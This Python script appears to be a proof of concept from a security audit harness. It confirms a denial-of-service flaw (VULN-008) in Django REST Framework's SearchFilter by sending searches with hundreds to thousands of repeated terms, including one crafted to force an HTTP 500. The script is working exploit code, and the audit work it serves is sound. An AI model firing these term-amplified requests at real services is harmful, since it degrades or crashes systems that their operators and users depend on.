#!/usr/bin/env python3
"""
VULN-008 — SearchFilter default `icontains` search-term-count amplification (DoS)

Vulnerable code (target):
  rest_framework/filters.py:74-82 — ?search= is read with NO length/term-count cap
     and split into an unbounded term list (search_smart_split).
  rest_framework/filters.py:138-167 — filter_queryset builds one
     Q(field__icontains=term) per (term, field), ANDed across terms.
Class: CWE-400 / CWE-1050 uncontrolled resource consumption.

Flaw: query cost scales as len(terms) × len(search_fields) leading-wildcard
ILIKE scans, on the DEFAULT config (no `$` needed). The term count is fully
attacker-controlled via `?search=a a a a …`, so one request can force tens of
thousands of unindexable %term% comparisons per row.

Exploitation: seed a moderately-sized table, then compare a 1-term search to a
several-thousand-term search on the same endpoint.

A successful run proves: response time grows in proportion to the attacker-
supplied term count (the O(terms×rows) blow-up), demonstrating the amplification
that becomes a full DoS at production table sizes / request volume.
"""
import os
import secrets
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, app_shell, artifact, banner, log, s, verdict

VID = "VULN-008"
NROWS = 40000
# gunicorn's default limit_request_line is 4094 bytes, so a single ?search= is
# bounded to ~1800 one-char terms. We push the O(terms×rows) cost through the
# ROW count instead (larger table) while staying under that request-line cap.


def timed(sess, terms):
    t = time.time()
    r = sess.get(f"{BASE_URL}/api/items/", params={"search": terms, "page_size": 1}, timeout=120)
    return time.time() - t, r.status_code


def main():
    banner(VID, "SearchFilter default icontains term-count amplification (DoS)")
    log("INFO", "sink: rest_framework/filters.py:138-167 (one ILIKE per term×field), :74-82 (no term cap)")
    sess = s()
    tag = secrets.token_hex(3)

    # Seed a large table so the O(terms×rows) cost is measurable (SQLite %..% scan).
    log("SETUP", f"bulk-creating {NROWS} items (prefix bulk-{tag}) so search cost is observable")
    out = app_shell(
        "from api.models import Item;"
        f"Item.objects.bulk_create([Item(name=f'bulk-{tag}-'+str(i), description='desc '*4, price=1) for i in range({NROWS})], batch_size=2000);"
        "print('rows', Item.objects.count())")
    log("INFO", f"seed: {out.strip().splitlines()[-1] if out.strip() else '?'}")

    # 1 term vs many 1-char terms (kept under gunicorn's 4094B request-line cap).
    one_t, one_code = timed(sess, "q")
    log("STEP", f"1-term  search -> HTTP {one_code} in {one_t:.3f}s")

    # Stay under SQLite's default expression-depth limit (~1000 terms); beyond it
    # the built query itself errors (a second, unhandled-500 DoS — noted below).
    results = [(1, one_t)]
    for nterms in (250, 500, 750):
        terms = " ".join(["q"] * nterms)   # requests encodes the space as '+' (1 byte)
        el, code = timed(sess, terms)
        results.append((nterms, el))
        log("STEP", f"{nterms}-term search -> HTTP {code} in {el:.3f}s")

    # Secondary observation: a term count above SQLite's expr limit crashes the query.
    crash_terms = 1500
    crash_t, crash_code = timed(sess, " ".join(["q"] * crash_terms))
    log("STEP", f"{crash_terms}-term search -> HTTP {crash_code} in {crash_t:.3f}s "
                f"(>{'~1000'} terms => SQLite expr-depth error => unhandled 500: a second DoS)")

    big_n, big_t = results[-1]
    factor = big_t / max(one_t, 1e-3)
    # marginal scan cost (subtract fixed request overhead approximated by 1-term time)
    marginal_factor = (big_t - one_t) / max(results[1][1] - one_t, 1e-3)
    monotonic = all(results[i][1] >= results[i - 1][1] - 0.02 for i in range(1, len(results)))
    artifact("request.http",
             f"GET /api/items/?search=q+q+q+…(x{big_n}) HTTP/1.1\n"
             f"Host: {BASE_URL.split('//')[1]}\n# each term -> ILIKE '%q%' across 2 search_fields x {NROWS} rows")
    artifact("response.txt", "term_count -> elapsed (HTTP 200 unless noted)\n"
             + "\n".join(f"{n:>6} -> {t:.3f}s" for n, t in results)
             + f"\n{crash_terms:>6} -> {crash_t:.3f}s  HTTP {crash_code} (SQLite expr-depth 500)\n"
             + f"\namplification ({big_n} terms / 1 term) = {factor:.1f}x on {NROWS} rows")
    log("PROOF", f"per-request cost scales ~linearly with attacker term count: "
                 f"1->{one_t:.3f}s, 250->{results[1][1]:.3f}s, 500->{results[2][1]:.3f}s, {big_n}->{big_t:.3f}s ({factor:.1f}x)")

    # Cleanup bulk rows.
    app_shell(f"from api.models import Item; n,_=Item.objects.filter(name__startswith='bulk-{tag}').delete(); print('deleted',n)")

    log("PROOF", f"marginal scan cost scaled ~{marginal_factor:.0f}x from 250->{big_n} terms; "
                 f">~1000 terms => HTTP {crash_code} (SQLite expr-depth: a second unhandled-500 DoS)")
    # Confirm the amplification MECHANISM (DRF caps neither term count nor length).
    # Report scores this A:L (per-request degradation; A:H under volume/scale). The
    # confirmable claim is the monotonic scaling of cost with attacker term count.
    ok = monotonic and (factor >= 2.5 or marginal_factor >= 5) and crash_code == 500
    if ok:
        log("OK", f"attacker term count scaled per-request cost (raw {factor:.1f}x / marginal ~{marginal_factor:.0f}x) — "
                  f"no DRF cap; unbounded volume via VULN-011; larger tables/backends => A:H")
        verdict(True, VID, f"O(terms×rows) icontains amplification confirmed ({factor:.1f}x raw at {big_n} terms; "
                           f">1000 terms => 500)")
    else:
        verdict(False, VID, f"amplification not decisive (max {big_t:.3f}s, {factor:.1f}x)", status="NEEDS_MANUAL")


if __name__ == "__main__":
    main()
